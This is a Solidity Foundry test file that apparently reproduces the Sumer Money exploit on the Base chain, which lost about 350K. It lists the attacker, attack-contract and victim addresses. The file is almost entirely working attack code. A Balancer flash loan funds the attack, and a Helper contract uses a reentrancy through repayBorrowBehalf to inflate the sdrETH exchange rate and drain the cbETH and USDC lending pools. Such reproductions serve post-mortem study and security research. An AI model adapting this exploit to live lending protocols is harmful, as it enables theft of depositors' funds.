// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : 350K
// Attacker : /address/https://basescan.org/address/0xbb344544ad328b5492397e967fe81737855e7e77
// Attack Contract : /address/https://basescan.org/address/0x13d27a2d66ea33a4bc581d5fefb0b2a8defe9fe7
// Vulnerable Contract : /address/https://basescan.org/address/0x23811c17bac40500decd5fb92d4feb972ae1e607
// Attack Tx : /tx/https://basescan.org/tx/0x619c44af9fedb8f5feea2dcae1da94b6d7e5e0e7f4f4a99352b6c4f5e43a4661

// @Info
// Vulnerable Contract Code : /address/https://basescan.org/address/0x23811c17bac40500decd5fb92d4feb972ae1e607#code

// @Analysis
// Post-mortem :
// Twitter Guy : https://twitter.com/0xNickLFranklin/status/1778986926705672698
// Hacking God :

interface IClaimer {
    function claim(uint256[] calldata tokenIds) external;
}

contract SumerMoney is Test {
    uint256 blocknumToForkFrom = 13_076_768;

    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH WETH = IWETH(payable(address(0x4200000000000000000000000000000000000006)));
    IERC20 USDC = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    IERC20 cbETH = IERC20(0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22);
    crETH sdrETH = crETH(payable(address(0x7b5969bB51fa3B002579D7ee41A454AC691716DC)));
    ICErc20Delegate sdrUSDC = ICErc20Delegate(0x142017b52c99d3dFe55E49d79Df0bAF7F4478c0c);
    ICErc20Delegate sdrcbETH = ICErc20Delegate(0x6345aF6dA3EBd9DF468e37B473128Fd3079C4a4b);
    IClaimer claimer = IClaimer(0x549D0CdC753601fbE29f9DE186868429a8558E07);
    Helper helper;

    function setUp() public {
        vm.label(address(Balancer), "Balancer");
        vm.label(address(WETH), "WETH");
        vm.label(address(USDC), "USDC");
        vm.label(address(cbETH), "cbETH");
        vm.label(address(sdrETH), "sdrETH");
        vm.label(address(sdrUSDC), "sdrUSDC");
        vm.label(address(sdrcbETH), "sdrcbETH");
        vm.label(address(claimer), "claimer");
        vm.createSelectFork("Base", blocknumToForkFrom);
    }

    function testExploit() public {
        deal(address(this), 1);
        address[] memory tokens = new address[](2);
        tokens[0] = address(WETH);
        tokens[1] = address(USDC);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 150 ether;
        amounts[1] = 645_000 * 1e6;
        bytes memory userData = "";
        Balancer.flashLoan(address(this), tokens, amounts, userData);

        emit log_named_decimal_uint("Attacker USDC Balance After exploit", USDC.balanceOf(address(this)), 6);
        emit log_named_decimal_uint("Attacker cbETH Balance After exploit", cbETH.balanceOf(address(this)), 18);
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        WETH.withdraw(amounts[0]);

        // sdrETH.exchangeRate
        emit log_named_decimal_uint("Before re-enter, sdrETH exchangeRate", sdrETH.exchangeRateCurrent(), 18);

        sdrETH.mint{value: amounts[0]}();

        helper = new Helper{value: 1}();
        USDC.transfer(address(helper), amounts[1]);
        helper.borrow(amounts[1]);

        WETH.deposit{value: amounts[0]}();
        WETH.transfer(address(Balancer), amounts[0]);
        USDC.transfer(address(Balancer), amounts[1]);
    }

    function attack() external {
        // exchangeRate == getCashPrior() + totalBorrows - totalReserves / totalSupply
        // In function repayBorrowBehalf(), getCashPrior() increase 150 ether but totalBorrows not decreased due to re-enter
        emit log_named_decimal_uint("In re-enter, sdrETH exchangeRate", sdrETH.exchangeRateCurrent(), 18);

        sdrcbETH.borrow(cbETH.balanceOf(address(sdrcbETH)));
        sdrUSDC.borrow(USDC.balanceOf(address(sdrUSDC)) - 645_000 * 1e6);
        sdrETH.redeemUnderlying(150 ether);
        uint256[] memory tokenIds = new uint256[](2);
        tokenIds[0] = 309;
        tokenIds[1] = 310;
        claimer.claim(tokenIds);
    }

    receive() external payable {}
}

contract Helper {
    address owner;
    IWETH WETH = IWETH(payable(address(0x4200000000000000000000000000000000000006)));
    IERC20 USDC = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    IERC20 cbETH = IERC20(0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22);
    crETH sdrETH = crETH(payable(address(0x7b5969bB51fa3B002579D7ee41A454AC691716DC)));
    ICErc20Delegate sdrUSDC = ICErc20Delegate(0x142017b52c99d3dFe55E49d79Df0bAF7F4478c0c);
    ICErc20Delegate sdrcbETH = ICErc20Delegate(0x6345aF6dA3EBd9DF468e37B473128Fd3079C4a4b);
    IClaimer claimer = IClaimer(0x549D0CdC753601fbE29f9DE186868429a8558E07);

    constructor() payable {
        owner = msg.sender;
    }

    function borrow(uint256 amount) external {
        USDC.approve(address(sdrUSDC), amount);
        sdrUSDC.mint(amount);

        uint256 borrowAmount = address(sdrETH).balance;
        sdrETH.borrow(borrowAmount);

        sdrETH.repayBorrowBehalf{value: borrowAmount + 1}(address(this)); // reentrancy

        sdrUSDC.redeem(sdrUSDC.balanceOf(address(this)));
        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = 311;
        claimer.claim(tokenIds);
        USDC.transfer(owner, USDC.balanceOf(address(this)));
    }

    receive() external payable {
        if (msg.value == 1) {
            owner.call(abi.encodeWithSignature("attack()"));
        }
    }
}
